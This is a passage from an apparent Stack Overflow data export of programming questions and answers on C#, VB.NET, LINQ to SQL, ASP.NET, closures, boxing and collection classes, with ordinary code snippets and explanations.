<p>I'm trying to do it with the following code. It is not working.</p>

<pre><code>            string user = Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(username + "":"" + password));

            byte[] bytes = System.Text.Encoding.ASCII.GetBytes(""ConMethod=++Connect++"");

            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(""http://10.0.0.1/st_poe.cgi"");

            request.Method = ""POST"";
            request.Headers.Add(""Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, application/x-shockwave-flash, */*"");
            request.Referer = ""http://10.0.0.1/RST_st_poe.htm"";
            request.Headers.Add(""Accept-Language: en-US"");
            request.UserAgent = ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)"";
            request.ContentType = ""application/x-www-form-urlencoded"";
            request.Headers.Add(""Accept-Encoding: gzip, deflate"");
            request.ContentLength = bytes.Length;
            request.Headers.Add(""Host: 10.0.0.1"");
            request.Headers.Add(""Connection: Keep-Alive"");
            request.Headers.Add(""Pragma: no-cache"");
            request.Headers.Add(""Authorization: Basic ""+user);


            Stream reqStream = request.GetRequestStream();

            reqStream.Write(bytes, 0, bytes.Length);

            reqStream.Close();
</code></pre>

<p>Can anyone point out where I'm messing up. I'm using HttpWebRequest for the first time.</p>
","33708","","<p>You should perform the actual request with </p>

<pre><code>var response = request.GetResponse();
</code></pre>

<p>Alternatively, you can use the simpler <code>System.Net.WebClient</code> class:</p>

<pre><code>var client = new WebClient();
client.Headers[""...""] = ...;
// Use one of the DownloadXXX/UploadXXX methods.
var responseBody = client.UploadData(""Url"", dataToUpload);
</code></pre>
"
"<p>What is the difference between a class with protected constructors and a class marked as <code>MustInherit</code>? (I'm programming in VB.Net but it probably equally applies to c#).</p>

<p>The reason I ask is because I have an abstract class that I want to convert the constructors to shared/static methods. (To add some constraints).</p>

<p>I can't do this because it's not possible to create an instance in the shared function.</p>

<p>I'm thinking to just remove the <code>MustInherit</code> keyword. Will this make any difference?</p>

<p>Thanks.</p>

<p>ETA:</p>

<p>I think i've answered my question, If I remove the MustInherit keyword, I can no longer include the MustOverrides, which are very useful.</p>

<p>With that in mind, is there any way around my problem?</p>

<p>ETA2:</p>

<p>To clarify, I can't do the below unless I remove the MustInherit keyword? </p>

<pre><code>Public MustInherit MyBaseClass

  Private Sub New() 
  End Sub 

  Protected Function CreateInstance(ParmList) As MyBaseClass
    If ParmList is Ok Then Return New MyBaseClass()
  End Function 

End Class
</code></pre>
","33708","","<p>You can call the <code>Protected</code> constructor using reflection and instantiate the class but you can't instantiate an <code>abstract</code> class in this way. You can declare <code>MustOverride</code> methods in <code>MustInherit</code> classes but <code>Protected</code> constructor can enforce nothing on derived classes.</p>

<p>You should always declare classes that are conceptually abstract as <code>MustInherit</code>. <code>Protected</code> constructors can be useful when you are providing it along with some <code>Public</code> overloads to provide some more functionality to derived classes.</p>
"
"<p>I'm looking to write a Truth Table Generator as a personal project.</p>

<p>There are several web-based online ones <a href=""http://www.brian-borowski.com/Software/Truth/"" rel=""nofollow"">here</a> and <a href=""http://www-cs-students.stanford.edu/~silver/truth/"" rel=""nofollow"">here</a>.</p>

<p><img src=""http://imgur.com/t1S9u.png"" alt=""alt text"" /><br />
<em><code>(Example screenshot of an existing Truth Table Generator</code>)</em></p>

<p>I have the following questions:</p>

<ul>
<li>How should I go about parsing expressions like: <em>((P => Q) &amp; (Q => R)) => (P => R)</em></li>
<li>Should I use a parser generator like ANTLr or YACC, or use straight regular expressions?</li>
<li>Once I have the expression parsed, how should I go about generating the truth table?  Each section of the expression needs to be divided up into its smallest components and re-built from the left side of the table to the right.  How would I evaluate something like that?</li>
</ul>

<p>Can anyone provide me with tips concerning the parsing of these arbitrary expressions and eventually evaluating the parsed expression?</p>
","33708","","<p>I think a parser generator is an overkill. You could use the idea of converting an expression to postfix and <a href=""http://stackoverflow.com/questions/423898/postfix-notation-to-expression-tree"">evaluating postfix expressions</a> (or directly building an expression tree out of the infix expression and using that to generate the truth table) to solve this problem.</p>
"
"<p>I have a string that contains a value of either TRUE or FALSE or null, this value is read from a text file which is outside of my control. What is the best way to use '|' with 'if'? Keeping in mind strValue could also be null, if strValue is null then I don't want to enter the if statement.</p>

<pre><code>if (strValue == ""FALSE"" | strValue == ""TRUE"")
{
  //do stuff
}
</code></pre>

<p>Thanks</p>
","33708","","<pre><code>if (strValue == ""FALSE"" || strValue == ""TRUE"") {
   // ...
}
</code></pre>

<p>to benefit from short circuiting. The second expression will not be tried if the first evaluates to <code>true</code>.</p>

<p>If you need case-insensitive comparisons:</p>

<pre><code>if (""FALSE"".Equals(strValue, StringComparison.InvariantCultureIgnoreCase) || 
    ""TRUE"".Equals(strValue, StringComparison.InvariantCultureIgnoreCase)) {
   // ...
}
</code></pre>

<p>Note that calling <code>.ToUpper()</code> or <code>.ToLower()</code> on <code>null</code> will throw <code>NullReferenceException</code>.</p>
"
"<p>I have an <code>IDataRecord reader</code> that I'm retrieving a decimal from as follows:</p>

<pre><code>decimal d = (decimal)reader[0];
</code></pre>

<p>For some reason this throws an invalid cast exception saying that the ""Specified cast is not valid.""</p>

<p>When I do <code>reader[0].GetType()</code> it tells me that it is an Int32. As far as I know, this shouldn't be a problem....</p>

<p>I've tested this out by this snippet which works just fine.</p>

<pre><code>int i = 3750;
decimal d = (decimal)i;
</code></pre>

<p>This has left me scratching my head wondering why it is failing to unbox the int contained in the reader as a decimal.</p>

<p>Does anyone know why this might be occurring? Is there something subtle I'm missing?</p>
","33708","","<p>You can only unbox a value type to its original type (and the nullable version of that type). </p>

<p>By the way, this is valid (just a shorthand for your two line version):</p>

<pre><code>object i = 4;
decimal d = (decimal)(int)i; // works even w/o decimal as it's a widening conversion
</code></pre>

<p>For the reason behind this read this <a href=""http://blogs.msdn.com/ericlippert/archive/2009/03/19/representation-and-identity.aspx"">Eric Lippert's blog entry: Representation and Identity</a></p>

<p>Personally, I categorize things done by cast syntax into four different types of operation (they all have different IL instructions):</p>

<ol>
<li>Boxing (<code>box</code> IL instruction) and unboxing (<code>unbox</code> IL instruction)</li>
<li>Casting through the inhertiance hierarchy (like <code>dynamic_cast&lt;Type&gt;</code> in C++, uses <code>castclass</code> IL instruction to verify)</li>
<li>Casting between primitive types (like <code>static_cast&lt;Type&gt;</code> in C++, there are plenty of IL instructions for different types of casts between primitive types)</li>
<li>Calling user defined conversion operators (at the IL level they are just method calls to the appropriate <code>op_XXX</code> method).</li>
</ol>
"
"<p>What is the difference between boxing/unboxing and type casting?</p>

<p>Often, the terms seem to be used interchangeably.</p>
","33708","","<p>Boxing and unboxing is a subset of type casts. Boxing is the act of treating a value type as reference type (which in practice, involves copying the contents of that value type (from stack) to the heap and returning a reference to that object). This allows a value type to be passed wherever a compatible reference type is expected. It also allows virtual method calls and other features of reference types to be performed on the value type. Unboxing is the reverse of this operation (getting back a value type out of a boxed object).</p>

<p>Type cast is the term used for <em>any</em> type of conversion from a variable of specific type to another. It's a broader concept. </p>

<p>A few minutes ago <a href=""http://stackoverflow.com/questions/1085097/1085105#1085105"">I answered a related question that covers this difference</a>. To summarize, I categorized different types of IL instructions generated by C# cast operator:</p>

<ol>
<li>Boxing (<code>box</code> IL instruction) and unboxing (<code>unbox</code> IL instruction)</li>
<li>Casting through the inhertiance hierarchy (like <code>dynamic_cast&lt;Type&gt;</code> in C++, uses <code>castclass</code> IL instruction to verify)</li>
<li>Casting between primitive types (like <code>static_cast&lt;Type&gt;</code> in C++, there are plenty of IL instructions for different types of casts between primitive types)</li>
<li>Calling user defined conversion operators (at the IL level they are just method calls to the appropriate <code>op_XXX</code> method).</li>
</ol>
"
"<p>Here's my Class that I'm grouping:</p>

<pre><code>public class RefundTran : DataObjectBase&lt;RefundTran&gt;
    {
        public string ARTranID { get; set; }
        public decimal Amount { get; set; }
        public string ARTranTypeCode { get; set; }
        public int CheckNumber { get; set; }
        public int CustID { get; set; }
        public string PaymentTypeCode { get; set; }
        public string PostedFlag { get; set; }
        public decimal TaxAmount { get; set; }
        public string TranDate { get; set; }
        public string RefNumber { get; set; }
        public decimal Balance { get; set; }
    }
</code></pre>

<p>Here's the List&lt;>:</p>

<pre><code>    List&lt;RefundTran&gt; trans = batchRefundToProcess.RefundCustomer.ARTransactions;
</code></pre>

<p>And here's the Linq query I've got so far:</p>

<pre><code>var TransGroupedByType =
                    from t in trans
                    group t by t.PaymentTypeCode into g
                    select new { CustID = g.First&lt;RefundTran&gt;().CustID, PaymentTypeCode = g.Key, TotalBalance = g.Sum (p=&gt; p.Balance) };
</code></pre>

<p>Basically, what I want is a group of transactions, keyed on both paymentTypeCode and TotalBalance, containing an array of RefundTran objects for that payment type code.</p>

<p>What am I missing?</p>

<p>Thanks in advance!</p>
","33708","","<p>It seems you want an array of transactions too, you should add it to the anonymous type:</p>

<pre><code>var TransGroupedByType = from t in trans
                         group t by t.PaymentTypeCode into g
                         select new { 
                            CustID = g.First().CustID, 
                            PaymentTypeCode = g.Key, 
                            TotalBalance = g.Sum(p =&gt; p.Balance),
                            TransactionList = g.ToArray()
                         };
</code></pre>
"
"<p>All of the examples I've seen of using <code>yield return x;</code> inside a C# method could be done in the same way by just returning the whole list. In those cases, is there any benefit or advantage in using the <code>yield return</code> syntax vs. returning the list?</p>

<p>Also, in what types of scenarios would <code>yield return</code> be used that you couldn't just return the complete list?</p>
","33708","","<p>But what if you were building a collection yourself?</p>

<p>In general, iterators can be used to <strong>lazily generate a sequence of objects</strong>. For example <code>Enumerable.Range</code> method does not have any kind of collection internally. It just generates the next number <strong>on demand</strong>. There are many uses to this lazy sequence generation using a state machine. Most of them are covered under <strong>functional programming concepts</strong>.</p>

<p>In my opinion, if you are looking at iterators just as a way to enumerate through a collection (it's just one of the simplest use cases), you're going the wrong way. As I said, iterators are means for returning sequences. The sequence might even be <strong>infinite</strong>. There would be no way to return a list with infinite length and use the first 100 items. It <strong>has</strong> to be lazy sometimes. <strong>Returning a collection is considerably different from returning a collection generator</strong> (which is what an iterator is). It's comparing apples to oranges.</p>

<p>Hypothetical example:</p>

<pre><code>static IEnumerable&lt;int&gt; GetPrimeNumbers() {
   for (int num = 2; ; ++num) 
       if (IsPrime(num))
           yield return num;
}

static void Main() { 
   foreach (var i in GetPrimeNumbers()) 
       if (i &lt; 10000)
           Console.WriteLine(i);
       else
           break;
}
</code></pre>

<p>This example prints prime numbers less than 10000. You can easily change it to print numbers less than a million without touching the prime number generation algorithm at all. In this example, you can't return a list of all prime numbers because the sequence is infinite and the consumer doesn't even know how many items it wants from the start.</p>
"
"<p>I have an IRepository interface that inherits from <code>IRepository&lt;TObject&gt;</code>. I also have a SqlRepository class that inherits from S<code>QLRepository&lt;TObject&gt;</code>, which in turn implements <code>IRepository&lt;TObject&gt;</code>. Why can't I instantiate a instance of SqlRepository as an IRepository?</p>

<pre><code>public class MyObject : IObject {
    ...
}

public interface IRepository&lt;TObject&gt; where TObject : IObject, new() {
    ...
}

public interface IRepository : IRepository&lt;MyObject&gt; { }

public class SqlRepository&lt;TObject&gt; : IRepository&lt;TObject&gt; where TObject : IObject, new() {
    ...
}

public class SqlRepository : SqlRepository&lt;MyObject&gt; { }

public class Controller {
    private IRepository _repository;

    public Controller() {
        _repository = new SqlRepository();
    }
}
</code></pre>

<p>The example above fails when trying to assign a new SqlRepository to _repository in the Controller class, with the following error message.</p>

<pre><code>Argument '1': cannot convert from 'SqlRepository' to 'IRepository'
</code></pre>

<p>Which basic principle of inheritance have I failed to grasp, please help.</p>
","33708","","<p>Because <code>IRepository</code> is an <code>IRepository&lt;MyObject&gt;</code> and not the other way around.</p>

<p>Basically:</p>

<p><code>SqlRepository</code> is a <code>SqlRepository&lt;MyObject&gt;</code><br />
which is an <code>IRepository&lt;MyObject&gt;</code>.<br />
To make that work, you should either inherit <code>IRepository&lt;TObject&gt;</code> from <code>IRepository</code> or make <code>SqlRepository</code> implement <code>IRepository</code> depending in your intention.</p>

<p>This issue is not generics-specific at all. Assume:</p>

<pre><code>interface IMovable { }
interface IDrivable : IMovable { } 
class Ball : IMovable { }
</code></pre>

<p>It's obvious that <code>Ball</code> is not an <code>IDrivable</code> while it is an <code>IMovable</code>.</p>
"
"<p>I am trying to figure out when and why to use a Dictionary or a HashTable.  I have done a bit of a search on here and have found people talking about the generic advantages of the Dictionary which I totally agree with, which leads the boxing and unboxing advantage for a slight performance gain.</p>

<p>But I have also read the Dictionary will not always return the objects in the order they are inserted, thing it is sorted.  Where as a HashTable will.  As I understand it this leads to the HashTable being far faster for some situations.</p>

<p>My question is really, what might those situations be?  Am I just wrong in my assumptions above?  What situations might you use to choose one above the other, (yes the last one is a bit ambiguous).</p>
","33708","","<p><code>System.Collections.Generic.Dictionary&lt;TKey, TValue&gt;</code> and <code>System.Collections.Hashtable</code> classes both maintain a hash table data structure internally. <strong>None of them guarantee preserving the order of items.</strong> </p>

<p>Leaving boxing/unboxing issues aside, most of the time, they should have very similar performance. </p>

<p>The primary structural difference between them is that <code>Dictionary</code> relies on <em>chaining</em> (maintaining a list of items for each hash table bucket) to resolve collisions whereas <code>Hashtable</code> uses <em>rehashing</em> for collision resolution (when a collision occurs, tries another hash function to map the key to a bucket).</p>

<p>There is little benefit to use <code>Hashtable</code> class if you are targeting for .NET Framework 2.0+. It's effectively rendered obsolete by <code>Dictionary&lt;TKey, TValue&gt;</code>.</p>
"
"<p>As title: is size_t always unsigned, i.e. for <code>size_t x</code>, is <code>x</code> always <code>&gt;= 0</code> ?</p>
","33708","","<p><strong>Yes</strong>. It's <em>usually</em> defined as something like the following (on 32-bit systems):</p>

<pre><code>typedef unsigned int size_t;
</code></pre>

<p>Reference:</p>

<p>C++ Standard Section 18.1 defines <code>size_t</code> is in <code>&lt;cstddef&gt;</code> which is described in C Standard as <code>&lt;stddef.h&gt;</code>.<br>
C Standard Section 4.1.5 defines <code>size_t</code> as an unsigned integral type of the result of the <code>sizeof</code> operator</p>
"
"<p>When calling the Skip() method with a starting index other than 0, the method automatically appends additional columns 'in addition to' the existing order-by column.  These additional order-by columns consist of the remaining columns that are not in the sort expression.  Great job for LINQ to handle this automatically for us as it provides deterministic sorting on the data returned;however, when 0 is passed to the Skip() method (when querying for the first page for instance), it appears that the method is optimized and the additional order-by columns aforementioned is not rendered.  This is problematic as the sort condition is inconsistent between Skip(0) and Skip(n).</p>

<p>Another developer, Dave, also pointed out the same issue.
Quote: ""Skip(0) should generate the same row numbering sql that skip(n) does...""
A link to the thread: <a href=""http://www.eggheadcafe.com/conversation.aspx?messageid=32045245&amp;threadid=32045239"" rel=""nofollow"">http://www.eggheadcafe.com/conversation.aspx?messageid=32045245&amp;threadid=32045239</a></p>

<p>Does anyone encounter a similar issue?  Fortunately the data we're querying has an identity column, so a work around we came up is to always append the identity column to the existing sort expression.  We would love to hear other creative approaches or solutions.</p>

<p><hr /></p>

<p><strong>Example</strong></p>

<p>Both queries below select the same columns from the database and include an descent ordering on the column, RequestReceivedDate.  Notice how the query generated by Skip(10) append additional ordering for the remaining columns which causes a different data ordering when there are records with the same RequestReceivedDate.  The idea of appending these extra sorting is great; however, the library should implement the same logic for Skip(0) so both Skip(0) and Skip(n) would return data in the same order. </p>

<p>[Query generated by Skip(0).Take(10)]</p>

<pre><code>SELECT TOP (10) [t31].[PersonId], [t31].[value] AS [RequestReceivedDate2], ....
FROM (
    SELECT [t0].[PersonId], (
        SELECT MAX([t8].[RequestReceivedDate])
        FROM [dbo].[EnrollRequest] AS [t8]
        WHERE EXISTS(
            SELECT NULL AS [EMPTY]
            FROM [dbo].[DomainAccount] AS [t9]
            WHERE ([t9].[DomainAccountId] = [t8].[DomainAccountId]) AND ([t9].[PersonId] = ([t0].[PersonId]))
            )
        ) AS [value], ... 
    ) AS [t31]
ORDER BY [t31].[value] DESC
</code></pre>

<p>[Query generated by Skip(10).Take(10)]</p>

<pre><code>SELECT [t32].[PersonId], [t32].[value] AS [RequestReceivedDate2], ...
FROM (
    SELECT ROW_NUMBER() OVER (ORDER BY [t31].[value] DESC) AS [ROW_NUMBER], [t31].[PersonId], [t31].[value], [t31].[FullAccountName], [t31].[LastName], ...
    FROM (
        SELECT [t0].[PersonId], (
            SELECT MAX([t8].[RequestReceivedDate])
            FROM [dbo].[EnrollRequest] AS [t8]
            WHERE EXISTS(
                SELECT NULL AS [EMPTY]
                FROM [dbo].[DomainAccount] AS [t9]
                WHERE ([t9].[DomainAccountId] = [t8].[DomainAccountId]) AND ([t9].[PersonId] = ([t0].[PersonId]))
                )
            ) AS [value], ...
    ) AS [t32]
WHERE [t32].[ROW_NUMBER] BETWEEN @p21 + 1 AND @p21 + @p22
ORDER BY [t32].[ROW_NUMBER]
</code></pre>
","33708","","<p>Apparently, <a href=""http://damieng.com/blog/2009/06/01/linq-to-sql-changes-in-net-40"" rel=""nofollow"">this issue is fixed in LINQ to SQL in .NET 4.0</a>:</p>

<blockquote>
  <p>Skip(0) no longer prevents eager loading</p>
</blockquote>
"
"<p>I have web page which is passing a querystring parameter to page 2:</p>

<pre><code>&lt;a href=""Page2.aspx?WONumber=12345""&gt;
</code></pre>

<p>On page 2 I want to have an href which passes the same parameter value to page 3.  I tried:</p>

<pre><code>&lt;a href=""Page3.aspx?WONumber="" + request.querystring(""WONumber"") &gt;
</code></pre>

<p>but that gives me a VS2008 error ""attribute 'request.querystring' is not a valid attribute of element 'a'"".  What should I be doing instead?</p>
","33708","","<p>Try this one (I assume ASP.NET/C#):</p>

<pre><code>&lt;a href='Page3.aspx?WONumber=&lt;%=
    HttpUtility.HtmlAttributeEncode(Request.QueryString[""WONumber""])%&gt;'&gt;Text&lt;/a&gt;
</code></pre>
"
"<p>I have a structure that roughly looks like this:</p>

<pre><code>List&lt;ProductLine&gt; -&gt; ID
                     Name
                     ...
                     List&lt;LineOfBusiness&gt; -&gt; ID
                                             Name
                                             ...
                                             List&lt;Watchlist&gt; -&gt; ID
                                                                Name
                                                                ReportCount
</code></pre>

<p>A Watchlist can exist under multiple LoBs but the ReportCount will only be for the count of reports that exist under that LoB for that WatchList.  I need them in the structure this way because the count of how many reports exist within a LoB for a given Watchlist is important elsewhere.</p>

<p>What I need to do is get a list of the distinct WatchLists (grouped based on ID) and have the ReportCount be the SUM of that watchlist's ReportCount across all LoBs.  I can't quite get the nested select logic to work right.</p>
","33708","","<p>The technique to flatten a hierarchical structure is to use the <code>SelectMany</code> method. You need something like this:</p>

<pre><code>var result = mainList.SelectMany(x =&gt; x.LineOfBusinessList)
                     .SelectMany(lob =&gt; lob.Watchlists)
                     .GroupBy(wl =&gt; wl.ID)
                     .Select(g =&gt; new { 
                            WatchlistID = g.Key,
                            WatchlistName = g.First().Name,
                            ReportCount = g.Sum(item =&gt; item.ReportCount)  
                     });
</code></pre>

<p>The first <code>SelectMany</code> call will transform the original list to sequence of all <code>LineOfBusiness</code> objects in all items. The second <code>SelectMany</code> call will transform a sequence of <code>LineOfBusiness</code> objects to a sequence containing all <code>Watchlist</code> objects it them. Then you group these <code>Watchlist</code>s by they <code>ID</code> and perform the actual query on them.</p>
"
"<p>I have a property within a class, that I need to iterate through all the possible distinct IDs from a relationship.</p>

<p>I am within a User, which belongs to a Company. Companies, have many solutions and each solution has many ""SolutionPortals"". What I want, is a list of all distinct ""PortalIds"" from the ""SolutionPortals"" (SolutionPortal.PortalID) that are in the DB.</p>

<p>I can't for the life of me get this as a single list. I keep getting:</p>

<pre><code>var solutionIds = from s in this.Company.Solutions.Select(s=&gt;s.SolutionPortals)
                  select s.Select(sp=&gt; sp.PortalID);
</code></pre>

<p>Of course this makes sense, since there is a list of Solutions, with a List of SolutionPortals, but I need to select JUST the IDS out into their own list. </p>

<pre><code>IEnumerable&lt;IEnumerable&lt;int&gt;&gt; // &lt;-- Don't want this
IEnumerable&lt;int&gt; // &lt;-- I want this
</code></pre>

<p>Any help would be EXTREMELY appreciated.</p>

<p>Thanks/</p>
","33708","","<p>You probably need something like this:</p>

<pre><code>var listOfIds = listOfSolutionPortals.SelectMany(sps =&gt; sps.Solutions)
                                     .Select(sp =&gt; sp.PortalId);
</code></pre>
"
"<p>I'm trying to use LINQ to SQL to select a few specific columns from a table and return the result as a strongly typed list of objects. </p>

<p>For Example:</p>

<pre><code>var result = (from a in DataContext.Persons
                              where a.Age &gt; 18
                              select new Person
                              {
                                  Name = a.Name,
                                  Age = a.Age
                              }
                              ).ToList();
</code></pre>

<p>Any help would be greatly appreciated.</p>

<p>It builds fine, but when I run it, I get the error. Explicit construction of entity type <code>MyEntity</code> in query is not allowed.</p>
","33708","","<p>Basically you are doing it the right way. However, you should use an instance of the <code>DataContext</code> for querying (it's not obvious that <code>DataContext</code> is an instance or the type name from your query):</p>

<pre><code>var result = (from a in new DataContext().Persons
              where a.Age &gt; 18
              select new Person { a.Name, a.Age }).ToList();
</code></pre>

<p>Apparently, the <code>Person</code> class is your LINQ to SQL generated entity class. You should create your own class if you only want some of the columns:</p>

<pre><code>class PersonInformation {
   public string Name {get;set;}
   public int Age {get;set;}
}

var result = (from a in new DataContext().Persons
              where a.Age &gt; 18
              select new PersonInformation { a.Name, a.Age }).ToList();
</code></pre>

<p>You can freely swap <code>var</code> with <code>List&lt;PersonInformation&gt;</code> here without affecting anything (as this is what the <strong>compiler</strong> does).</p>

<p>Otherwise, if you are working locally with the query, I suggest considering an anonymous type:</p>

<pre><code>var result = (from a in new DataContext().Persons
              where a.Age &gt; 18
              select new { a.Name, a.Age }).ToList();
</code></pre>

<p>Note that <strong>in all of these cases</strong>, the <code>result</code> is <strong>statically typed</strong> (it's type is known at compile time). The latter type is a <code>List</code> of a compiler generated anonymous class similar to the <code>PersonInformation</code> class I wrote above. As of C# 3.0, there's no dynamic typing in the language.</p>

<h2>UPDATE:</h2>

<p>If you really want to return a <code>List&lt;Person&gt;</code> (which might or might not be the best thing to do), you can do this:</p>

<pre><code>var result = from a in new DataContext().Persons
             where a.Age &gt; 18
             select new { a.Name, a.Age };

List&lt;Person&gt; list = result.AsEnumerable()
                          .Select(o =&gt; new Person {
                                           Name = o.Name, 
                                           Age = o.Age
                          }).ToList();
</code></pre>

<p>You can merge the above statements too, but I separated them for clarity.</p>
"
"<p>In Boo, let's say I'm overriding a method that takes a parameter that takes <code>string[] urls</code>. Type inference, for whatever reason, isn't matching up to the base class, so I need to explicitly specify the type of the parameter.</p>

<pre><code>class MyClass: MyBase
  override method(urls as Array[of (string)])
    dostuff()
</code></pre>

<p>This turns out not to be correct Boo syntax. What's the right way of specifying that I'm overriding a method that takes an array parameter?</p>

<p>Normally I prefer to expect an IEnumerable, but I'm overriding someone else's base class, which is part of Rhino.DSL.</p>

<p>Edited to add: It turns out my issue was only tangentially related to the array declaration syntax... my real problem was two different versions of the Boo Assembly being referenced in my project.</p>
","33708","","<p>Parenthesis around a type represents an array of that type:</p>

<pre><code>class MyClass : MyBase
  override def method(urls as (string)):
    dostuff()
</code></pre>
"
"<p>Using t-sql, how can i find if all SQL Logins have strong passwords on SQL 2000 and 2005 servers?</p>

<p>Any help, much appreciated.</p>

<p>Regards
Manjot</p>
","33708","","<p>You can't! It's would be a security issue if you could identify weak passwords. You might want to force all users to change their passwords and enforce a password policy.</p>

<p>The cracker: </p>

<pre><code>// pseudocode:
foreach (var username in 
   exec(@""SELECT username FROM hypothetical.fn_get_users_with_weak_passwords()""))
    PerformDictionaryAttack(username);
</code></pre>

<p>Not so good... ain't it?</p>
"
"<p>been playing around with ResolveClientUrl(""~/Confirmation.aspx"")  and other methods..</p>

<p>I am tryin go get the FULL absolute URL of the page including Http: etc etc..</p>

<p>Anyone knows how to do this?</p>

<p>thanks</p>
","33708","","<pre><code>Request.Url.ToString()
</code></pre>

<p>gets the absolute URL for the current request.</p>

<p>If you want to get it for a relative path:</p>

<pre><code>Request.Url.GetLeftPart(UriPartial.Authority) 
                      + VirtualPathUtility.ToAbsolute(relativePath)
</code></pre>
"
"<p>I'm trying to start a new ASP.NET Web Application Project using Visual Studio 2008.  The default language is somehow VB and I want C#... I cannot for the life of me figure out how to change it to C#.  I've gotta be missing something somewhere.... thanks!</p>
","33708","","<p>Huh? Do you have Visual C# component installed? You should select ASP.NET Web Application from Visual C# <code>-&gt;</code> Web category.</p>
"
"<p>What is a good resource for finding out the warning numbers in Visual C# 2008. I found this page: <a href=""http://msdn.microsoft.com/en-us/library/4wtxwb6k.aspx"" rel=""nofollow"">http://msdn.microsoft.com/en-us/library/4wtxwb6k.aspx</a> but it's very hard to sort through the warning numbers.</p>

<p>I am trying to figure out which warning number to use for the warning disable pragma:</p>

<p><a href=""http://msdn.microsoft.com/en-us/library/441722ys.aspx"" rel=""nofollow"">http://msdn.microsoft.com/en-us/library/441722ys.aspx</a></p>

<p>Specifically, I am trying to find the one related to Missing XML comments for publicly visible types.</p>
","33708","","<p>It's CS1591. Just press F1 on the warning location to view MSDN documentation for it. </p>

<p>You can resolve this specific warning either by:</p>

<ul>
<li>Reducing warning level (it's a level 4 warning)</li>
<li>Removing <code>/doc</code> switch (which will stop XML file generation)</li>
<li>Disable the warning using <code>#pragma</code> directive</li>
<li>Disable the warning using <code>/nowarn:1591</code> switch</li>
</ul>
"
"<p>I've sometimes seen code written like this :</p>

<pre><code>public class B1
{
}

public class B2
{
    private B1 b1;

    public B1 B1
    {
        get { return b1; }
        set { b1 = value; }
    }
}
</code></pre>

<p>i.e. class B2 has a property named ""B1"", which is also of type ""B1"". </p>

<p>My gut instinct tells me this is not a good idea, but are there any technical reasons why you should avoid giving a property the same name as its class ?</p>

<p>(I'm using .net 2.0, in case that matters).</p>
","33708","","<p>There's no specific technical problem with it. It might harm or improve readability. In fact, some Microsoft libraries have these kind of properties (specifically, with <code>enum</code> properties, this usually makes sense).</p>
"
"<p>I've read through previous topics on closures on stackflow and other sources and one thing is still confusing me.  From what I've been able to piece together technically a closure is simply the set of data containing the code of a function and the value of <strong>bound variables</strong> in that function.</p>

<p>In other words technically the following C function should be a closure from my understanding:</p>

<pre><code>int count()
{
    static int x = 0;

    return x++;
}
</code></pre>

<p>Yet everything I read seems to imply closures must somehow involve passing functions as first class objects.   In addition it usually seems to be implied that closures are not part of procedural programming.  Is this a case of a solution being overly associated with the problem it solves or am I misunderstanding the exact definition?</p>
","33708","","<p>For the <a href=""http://en.wikipedia.org/wiki/Closure%5F%28computer%5Fscience%29"">exact definition, I suggest looking at its Wikipedia entry</a>. It's especially good. I just want to clarify it with an example.</p>

<p>Assume this C# code snippet (that's supposed to perform an <code>AND</code> search in a list):</p>

<pre><code>List&lt;string&gt; list = new List&lt;string&gt; { ""hello world"", ""goodbye world"" };
IEnumerable&lt;string&gt; filteredList = list;
var keywords = new [] { ""hello"", ""world"" };
foreach (var keyword in keywords)
    filteredList = filteredList.Where(item =&gt; item.Contains(keyword));

foreach (var s in filteredList)  // closure is called here
    Console.WriteLine(s);
</code></pre>

<p>It's a common pitfall in C# to do something like that. If you look at the lambda expression inside <code>Where</code>, you'll see that it defines a function that it's behavior depends on the value of a variable at its definition site. It's like passing a <em>variable itself</em> to the function, rather than the <em>value of that variable</em>. Effectively, when this closure is called, it retrieves the value of <code>keyword</code> variable at that time. The result of this sample is very interesting. It prints out <strong>both</strong> ""hello world"" and ""goodbye world"", which is not what we wanted. What happened? As I said above, the function we declared with the lambda expression is <strong>a closure over <code>keyword</code> <em>variable</em></strong> so this is what happens:</p>

<pre><code>filteredList = filteredList.Where(item =&gt; item.Contains(keyword))
                           .Where(item =&gt; item.Contains(keyword));
</code></pre>

<p>and at the time of closure execution, <code>keyword</code> has the value ""world,"" so we're basically filtering the list a couple times with the same keyword. The solution is:</p>

<pre><code>foreach (var keyword in keywords) {
    var temporaryVariable = keyword;
    filteredList = filteredList.Where(item =&gt; item.Contains(temporaryVariable));
}
</code></pre>

<p>Since <code>temporaryVariable</code> is scoped to the <strong>body</strong> of the <code>foreach</code> loop, in every iteration, it is a different variable. In effect, each closure will bind to a distinct variable (those are different instances of <code>temporaryVariable</code> at each iteration). This time, it'll give the correct results (""hello world""):</p>

<pre><code>filteredList = filteredList.Where(item =&gt; item.Contains(temporaryVariable_1))
                           .Where(item =&gt; item.Contains(temporaryVariable_2));
</code></pre>

<p>in which <code>temporaryVariable_1</code> has the value of ""hello"" and <code>temporaryVariable_2</code> has the value ""world"" at the time of closure execution. </p>

<p>Note that the closures have caused an extension to the lifetime of variables (their life were supposed to end after each iteration of the loop). This is also an important side effect of closures. </p>
"
"<p>I was trying to create an extension that could slice any array-like class (since slicing is oddly absent in the standard libraries). For example:</p>

<pre><code>public static M Slice&lt;M,T&gt;(this M source, int start, int end) where M : IList&lt;T&gt;
{
    //slice code
}
</code></pre>

<p>However, the compiled does not attach this method to objects of type M (even though its error message claims that that is what it is looking for). It seems rather to be dependent upon the type parameters of the method itself, e.g.  in some manner, but I don't fully understand how things are working.</p>

<p>(yes, one could easily write an example that just works with List, but I'm curious if this is even possible.)</p>
","33708","","<p>There compiler does not infer the type <code>T</code> automatically for these cases. Even if it wasn't an extension method, you still had to specify the type parameters manually.</p>

<p>For example what if the class was declared as:</p>

<pre><code>class MyNastyClass : IList&lt;int&gt;, IList&lt;double&gt; {
}
</code></pre>

<p>What would you expect <code>T</code> to be? <code>int</code> or <code>double</code>? As a result, you'll always have to manually call it with the specific parameters:</p>

<pre><code>Slice(myList, 0, 10); // compile-time error, T cannot be inferred.
Slice&lt;IList&lt;int&gt;, int&gt;(myList, 0, 10); // works.
</code></pre>

<p>The workaround is to remove the type parameter <code>T</code> (no constraints needed here):</p>

<pre><code>public static void Slice&lt;M&gt;(this IList&lt;M&gt; source, int start, int end)
